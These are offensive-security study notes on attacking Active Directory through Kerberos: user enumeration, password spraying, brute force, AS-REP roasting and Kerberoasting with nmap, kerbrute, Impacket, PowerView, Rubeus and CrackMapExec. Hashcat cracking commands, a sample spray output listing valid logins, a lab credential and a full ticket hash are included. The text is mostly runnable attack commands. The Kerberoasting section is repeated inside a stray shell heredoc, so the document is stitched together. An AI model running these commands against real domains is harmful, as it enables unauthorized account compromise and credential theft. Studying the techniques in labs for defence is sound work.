# 🕵️ Kerberos Username Enumeration

> Offensive-Active-Directory / Kerberos-Enumeration / Kerberos-Username-Enumeration

Kerberos username enumeration is a technique used in Active Directory environments to identify valid user accounts without authentication. By interacting with the Kerberos protocol (port 88), attackers can distinguish between valid and invalid usernames based on authentication responses.

This document covers two common methods:

- Nmap (`krb5-enum-users` NSE script)
- Kerbrute

---

## 📌 Table of Contents

- [1. Username Enumeration with Nmap](#1-username-enumeration-with-nmap)
- [Parsing Nmap Results](#parsing-nmap-results)
- [2. Username Enumeration with Kerbrute](#2-username-enumeration-with-kerbrute)
- [Cracking AS-REP Hashes with Hashcat](#cracking-as-rep-hashes-with-hashcat)
- [Password Spraying](#password-spraying)
- [Live Example — Successful Password Spray](#live-example--successful-password-spray)
- [Brute Force Attacks](#brute-force-attacks)
- [Best Practices](#best-practices)

---

## 1. Username Enumeration with Nmap

The `krb5-enum-users` NSE script sends Kerberos AS-REQ requests and analyzes responses to determine valid usernames.

### Basic Scan

```bash
nmap -v -sT -sV --script=krb5-enum-users.nse -p 88 192.168.2.100
```

### Scan with Custom Username List

```bash
nmap -v -sT -sV -p 88 --script=krb5-enum-users --script-args krb5.enum-users.realm='htb.local',userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 192.168.2.100
```

### Output Results in All Formats

```bash
nmap -v -sT -sV -p 88 --script=krb5-enum-users --script-args krb5.enum-users.realm='armourinfosec.local',userdb=/root/ad/username.txt 192.168.1.50 -oA krb-users
```

---

## Parsing Nmap Results

### Extract Valid Usernames

```bash
grep \@armourinfosec\.local krb-users.nmap
```

### Extract Username Field (Column 6)

```bash
grep \@armourinfosec\.local krb-users.nmap | cut -d " " -f 6 > krb-users-list.txt
```

---

## 2. Username Enumeration with Kerbrute

### Help Menu

```bash
kerbrute -h
```

### User Enumeration

**Basic Enumeration:**

```bash
kerbrute userenum --dc 192.168.2.100 -d htb.local -o kerbrute.log usernames.txt
```

```bash
kerbrute userenum --dc 192.168.2.100 -d infosecwarrior.local -o kerbrute.log /opt/username.txt
```

**Verbose Mode:**

```bash
kerbrute userenum --dc 192.168.2.100 -d htb.local -o kerbrute.log usernames.txt -v
```

**Save AS-REP Hashes:**

```bash
kerbrute userenum --dc 192.168.2.100 -d htb.local \
  -o kerbrute.log usernames.txt \
  --hash-file AS-REP-hash.txt
```

**View Hashes:**

```bash
cat AS-REP-hash.txt
```

---

## Cracking AS-REP Hashes with Hashcat

### Identify Kerberos Hash Modes

Identify the correct hash mode for AS-REP hashes before cracking, then run:

```bash
hashcat -a 0 -m 18200 AS-REP-hash.txt /opt/rockyou.txt
```

---

## Password Spraying

Password spraying tests a single password against multiple usernames.

### Example

```bash
kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \
  -o kerbrute.log krb-users-list.txt armour123
```

### Alternate Password

```bash
kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \
  -o kerbrute.log krb-users-list.txt 12344321
```

---

## Live Example — Successful Password Spray

```bash
kerbrute passwordspray --dc 192.168.2.100 -d infosecwarrior.local -o kerbrute.log /opt/username.txt Password@123
```

**Sample output:**

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 04/02/26 - Ronnie Flathers @ropnop

2026/04/02 15:47:45 >  Using KDC(s):
2026/04/02 15:47:45 >   192.168.2.100:88

2026/04/02 15:47:45 >  [+] VALID LOGIN:  alice@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  charlie@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  bob@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  frank@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  david@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  grace@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  irene@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  jack@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  leo@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  kate@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  nina@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  peter@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  steve@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  [+] VALID LOGIN:  quinn@infosecwarrior.local:Password@123
2026/04/02 15:47:45 >  Done! Tested 43 logins (14 successes) in 0.036 seconds
```

> 14 of 43 tested accounts shared the same password — a strong signal of an organization-wide weak/default password in use.

---

## Brute Force Attacks

### Single User

```bash
kerbrute bruteuser --dc 192.168.2.100 -d infosecwarrior.local /opt/passwords.txt administrator
```

```bash
kerbrute bruteuser --dc 192.168.2.100 -d infosecwarrior.local /opt/password.txt bob
```

### Username + Password Combinations

```bash
kerbrute bruteforce --dc 192.168.2.100 -d infosecwarrior.local -o kerbrute.log /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt
```

---

## Best Practices

- Use the Domain Controller IP to avoid DNS resolution issues
- Monitor logs carefully for false positives or lockouts
- Avoid aggressive spraying to prevent account lockouts
- Combine results with tools like BloodHound for privilege escalation paths
- Perform testing only in authorized environments

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>

# ⚔️ Kerberoasting Attack

> Offensive-Active-Directory / Kerberos-Enumeration / Kerberoasting-Attack

- Kerberoasting is an attack technique in Active Directory environments that allows attackers to extract service account credentials by requesting **Kerberos service tickets (TGS)** for accounts associated with **Service Principal Names (SPNs)**.
- The extracted tickets are encrypted using the service account's password hash and can be cracked offline.

---

## 📌 Table of Contents

- [Objectives](#objectives)
- [Target Machines](#target-machines)
- [1. Enumerate SPNs Using LDAP](#1-enumerate-spns-using-ldap)
- [2. Create a Roastable User (Lab Setup)](#2-create-a-roastable-user-lab-setup)
- [3. Kerberoasting with Impacket](#3-kerberoasting-with-impacket)
- [4. Kerberoasting with PowerView](#4-kerberoasting-with-powerview)
- [5. Cracking Kerberos TGS Hashes](#5-cracking-kerberos-tgs-hashes)
- [6. Automated Kerberoasting Tools](#6-automated-kerberoasting-tools)

---

## Objectives

- Enumerate SPNs linked to domain accounts
- Request Kerberos service tickets (TGS)
- Extract ticket hashes
- Crack hashes offline using tools like `hashcat`

---

## Target Machines

- Active (Hack The Box)
- Tentacle (Hack The Box)

---

## 1. Enumerate SPNs Using LDAP

Use `ldapsearch` to query Active Directory and extract SPNs.

```bash
ldapsearch -x -H ldap://192.168.1.50 \
  -D '' -w '' \
  -b 'DC=armourinfosec,DC=local' > ldapsearch-output.txt
```

**Extract `servicePrincipalName`:**

```bash
grep servicePrincipalName ldapsearch-output.txt
```

```bash
grep servicePrincipalName ldapsearch-output.txt | cut -d " " -f2 > spn-list.txt
```

**Extract `userPrincipalName`:**

```bash
grep userPrincipalName ldapsearch-output.txt | cut -d " " -f2 > upn-list.txt
```

> Note: an earlier LDAP enumeration pass against `192.168.2.100` used the same approach with a blank `dc=infosecwarrior,dc=local` bind, extracting both `servicePrincipalName` and `userPrincipalName` into `spn-list.txt` / `upn-list.txt` respectively.

---

## 2. Create a Roastable User (Lab Setup)

Simulate a vulnerable service account by assigning an SPN.

```powershell
$PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"

New-ADUser -Name "Kerbe-roast" `
  -Description "Kerberoasting Lab" `
  -Enabled $true `
  -AccountPassword $PASSWORD

Set-ADUser -Identity Kerbe-roast `
  -ServicePrincipalNames @{Add="HTTP/dc01.infosecwarrior.local"}
```

---

## 3. Kerberoasting with Impacket

Use `GetUserSPNs.py` to request service tickets.

```bash
GetUserSPNs.py 'armourinfosec.local/username:password' -dc-ip 192.168.2.100 -request
```

```bash
GetUserSPNs.py 'infosecwarrior.local/bob:Password@123' -dc-ip 192.168.2.100 -request
```

### Example (HTB Lab)

```bash
GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' \
  -dc-ip 10.10.10.100 -request
```

> Successful execution returns TGS hashes in `hashcat` format.

---

## 4. Kerberoasting with PowerView

If you have access to a domain-joined system:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -SPN *
```

### Dump Hashes

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

---

## 5. Cracking Kerberos TGS Hashes

### Example Hash

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$592351546cd8afbb007b085d3877754a$897fed706af35b5464703a73e895a051a6508c2a61d39ea8db161f1e1e54eb45645fee3eb4a3ae0be139909700215dcae667260cd9225760dc54fd700a59bb4e43c1660c20affd777cabafd70a27d1a70183cb61939355a1e0516dc3723725f2b44f1debdb445ff756976d88dedf0c490b5b9c2ec573a90e805e69a44890e255f0593cca952593ef7deec525f9bedb7eed1c3179137386b18390d4408d1c3230d374144f5367fc335294f36ae6fd234ac97f981fd424ea163f0dfa569ef993594c9635d74e7bcb94465055207a4eb2545ca87eadc671c9613ecc04a366137f8140dc88e99cc04c690a32f1dff06434b7374c11698d5263c272f2163e999220eed950a853c0c7eb6fe6a642d0c99f498dd9e593ff052ae62a8cc09635082ccd3412d8d2d852a5513cde5e2693971e6136c14aecbf05019b9f9bf6c6c36642336889e43f81791492341b1cf6eb14ff0d243a92e505642721b96b4387ff6d75ec148d623387120f375f4579c9841fbd875c45db1e535b4d43deb0a8377c3c0f4612b1ba637c9f2d2494452c7e5264ef2547ea877e9bb127e2b1fff78ef4891b8b28800ad0d1a669eb9b4bcb0e2b8d411afce71643b62c577b3900f97288bfe9ad35e38d238396a02f1302aaefaf470694458f5366b8e52b4d220c4b6f7c67db96c65a9f5e61a264661341ed70cbc674b9d421d314e927d9c52658417213f846d50f3b35f7bf2075d5a6f6a8766dfc221d546e6f9da8409c5455e4e33d10b755376e5bcf74700690a0d1d08d16464b42413ab005117a837ac4bb13c87dfe42ceca6dc1176a99abe9486917b43942e131da9f905ad1b9ae64812234901604749cb617a631d6c3529c2a314d05c15e9395a8485038ad48606f3745a5041c57660fcc5446a055ca4ba2f13d789ac8da997652fb54a9604693aec6f6f870a77b7dd820380e21471a533ec6e017fa2ccad01ac6c41607fb267f903533f640fa8de9e121ba2c828aae7386e4e37fee835a3a417f32f9540b8dc1dddd31f0c69975ddbfe543b1ade38e4d19ce26b1ef555f1adbbaf49368658cbd34c849f5ea4da92022fe16f2df48029a7457520b5510943bef3daac0238baf65bbdd4632cbc7e7fc85075d7166c167968cf3a5126eb3ad7e71bcc7281ddf56f5d7b927405c4247899f067757a866a10630931acad6cc86e4b4b878469cae475ecf09bdbf0ac598d84d5d37e4136dae4b586ac8c02938aa76ee27e43a1059b0e1344dd32ab3
```

### Save Hashes

Store extracted hashes in:

```
kerberoast-hashes.txt
```

### Crack Using Hashcat (TGS)

```bash
hashcat -m 13100 -a 0 kerberoast-hashes.txt /opt/rockyou.txt
```

### Crack AS-REP Hashes (if applicable)

```bash
hashcat -m 18200 -a 0 AS-REP-hash.txt /opt/rockyou.txt
```

### Monitor Progress

```bash
watch -n 2 "hashcat -m 13100 --show kerberoast-hashes.txt"
```

---

## 6. Automated Kerberoasting Tools

### Rubeus

```powershell
Rubeus.exe kerberoast /format:hashcat /domain:armourinfosec.local /user:username /rc4:hash
```

### CrackMapExec

```bash
crackmapexec smb 192.168.2.100 \
  -u username -p password --kerberoasting kerberoast-output.txt
```

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>

bash

cat > /mnt/user-data/outputs/Kerberoasting-Attack.md << 'EOF'
# ⚔️ Kerberoasting Attack

> Offensive-Active-Directory / Kerberos-Enumeration / Kerberoasting-Attack

- Kerberoasting is an attack technique in Active Directory environments that allows attackers to extract service account credentials by requesting **Kerberos service tickets (TGS)** for accounts associated with **Service Principal Names (SPNs)**.
- The extracted tickets are encrypted using the service account's password hash and can be cracked offline.

---

## 📌 Table of Contents

- [Objectives](#objectives)
- [Target Machines](#target-machines)
- [1. Enumerate SPNs Using LDAP](#1-enumerate-spns-using-ldap)
- [2. Create a Roastable User (Lab Setup)](#2-create-a-roastable-user-lab-setup)
- [3. Kerberoasting with Impacket](#3-kerberoasting-with-impacket)
- [4. Kerberoasting with PowerView](#4-kerberoasting-with-powerview)
- [5. Cracking Kerberos TGS Hashes](#5-cracking-kerberos-tgs-hashes)
- [6. Automated Kerberoasting Tools](#6-automated-kerberoasting-tools)

---

## Objectives

- Enumerate SPNs linked to domain accounts
- Request Kerberos service tickets (TGS)
- Extract ticket hashes
- Crack hashes offline using tools like `hashcat`

---

## Target Machines

- Active (Hack The Box)
- Tentacle (Hack The Box)

---

## 1. Enumerate SPNs Using LDAP

Use `ldapsearch` to query Active Directory and extract SPNs.

```bash
ldapsearch -x -H ldap://192.168.1.50 \
  -D '' -w '' \
  -b 'DC=armourinfosec,DC=local' > ldapsearch-output.txt
```

**Extract `servicePrincipalName`:**

```bash
grep servicePrincipalName ldapsearch-output.txt
```

```bash
grep servicePrincipalName ldapsearch-output.txt | cut -d " " -f2 > spn-list.txt
```

**Extract `userPrincipalName`:**

```bash
grep userPrincipalName ldapsearch-output.txt | cut -d " " -f2 > upn-list.txt
```

> Note: an earlier LDAP enumeration pass against `192.168.2.100` used the same approach with a blank `dc=infosecwarrior,dc=local` bind, extracting both `servicePrincipalName` and `userPrincipalName` into `spn-list.txt` / `upn-list.txt` respectively.

---

## 2. Create a Roastable User (Lab Setup)

Simulate a vulnerable service account by assigning an SPN.

```powershell
$PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"

New-ADUser -Name "Kerbe-roast" `
  -Description "Kerberoasting Lab" `
  -Enabled $true `
  -AccountPassword $PASSWORD

Set-ADUser -Identity Kerbe-roast `
  -ServicePrincipalNames @{Add="HTTP/dc01.infosecwarrior.local"}
```

---

## 3. Kerberoasting with Impacket

Use `GetUserSPNs.py` to request service tickets.

```bash
GetUserSPNs.py 'armourinfosec.local/username:password' -dc-ip 192.168.2.100 -request
```

```bash
GetUserSPNs.py 'infosecwarrior.local/bob:Password@123' -dc-ip 192.168.2.100 -request
```

### Example (HTB Lab)

```bash
GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' \
  -dc-ip 10.10.10.100 -request
```

> Successful execution returns TGS hashes in `hashcat` format.

---

## 4. Kerberoasting with PowerView

If you have access to a domain-joined system:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -SPN *
```

### Dump Hashes

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

---

## 5. Cracking Kerberos TGS Hashes

### Example Hash

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$592351546cd8afbb007b085d3877754a$897fed706af35b5464703a73e895a051a6508c2a61d39ea8db161f1e1e54eb45645fee3eb4a3ae0be139909700215dcae667260cd9225760dc54fd700a59bb4e43c1660c20affd777cabafd70a27d1a70183cb61939355a1e0516dc3723725f2b44f1debdb445ff756976d88dedf0c490b5b9c2ec573a90e805e69a44890e255f0593cca952593ef7deec525f9bedb7eed1c3179137386b18390d4408d1c3230d374144f5367fc335294f36ae6fd234ac97f981fd424ea163f0dfa569ef993594c9635d74e7bcb94465055207a4eb2545ca87eadc671c9613ecc04a366137f8140dc88e99cc04c690a32f1dff06434b7374c11698d5263c272f2163e999220eed950a853c0c7eb6fe6a642d0c99f498dd9e593ff052ae62a8cc09635082ccd3412d8d2d852a5513cde5e2693971e6136c14aecbf05019b9f9bf6c6c36642336889e43f81791492341b1cf6eb14ff0d243a92e505642721b96b4387ff6d75ec148d623387120f375f4579c9841fbd875c45db1e535b4d43deb0a8377c3c0f4612b1ba637c9f2d2494452c7e5264ef2547ea877e9bb127e2b1fff78ef4891b8b28800ad0d1a669eb9b4bcb0e2b8d411afce71643b62c577b3900f97288bfe9ad35e38d238396a02f1302aaefaf470694458f5366b8e52b4d220c4b6f7c67db96c65a9f5e61a264661341ed70cbc674b9d421d314e927d9c52658417213f846d50f3b35f7bf2075d5a6f6a8766dfc221d546e6f9da8409c5455e4e33d10b755376e5bcf74700690a0d1d08d16464b42413ab005117a837ac4bb13c87dfe42ceca6dc1176a99abe9486917b43942e131da9f905ad1b9ae64812234901604749cb617a631d6c3529c2a314d05c15e9395a8485038ad48606f3745a5041c57660fcc5446a055ca4ba2f13d789ac8da997652fb54a9604693aec6f6f870a77b7dd820380e21471a533ec6e017fa2ccad01ac6c41607fb267f903533f640fa8de9e121ba2c828aae7386e4e37fee835a3a417f32f9540b8dc1dddd31f0c69975ddbfe543b1ade38e4d19ce26b1ef555f1adbbaf49368658cbd34c849f5ea4da92022fe16f2df48029a7457520b5510943bef3daac0238baf65bbdd4632cbc7e7fc85075d7166c167968cf3a5126eb3ad7e71bcc7281ddf56f5d7b927405c4247899f067757a866a10630931acad6cc86e4b4b878469cae475ecf09bdbf0ac598d84d5d37e4136dae4b586ac8c02938aa76ee27e43a1059b0e1344dd32ab3
```

### Save Hashes

Store extracted hashes in:

```
kerberoast-hashes.txt
```

### Crack Using Hashcat (TGS)

```bash
hashcat -m 13100 -a 0 kerberoast-hashes.txt /opt/rockyou.txt
```

### Crack AS-REP Hashes (if applicable)

```bash
hashcat -m 18200 -a 0 AS-REP-hash.txt /opt/rockyou.txt
```

### Monitor Progress

```bash
watch -n 2 "hashcat -m 13100 --show kerberoast-hashes.txt"
```

---

## 6. Automated Kerberoasting Tools

### Rubeus

```powershell
Rubeus.exe kerberoast /format:hashcat /domain:armourinfosec.local /user:username /rc4:hash
```

### CrackMapExec

```bash
crackmapexec smb 192.168.2.100 \
  -u username -p password --kerberoasting kerberoast-output.txt
```

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>
EOF
echo "done"
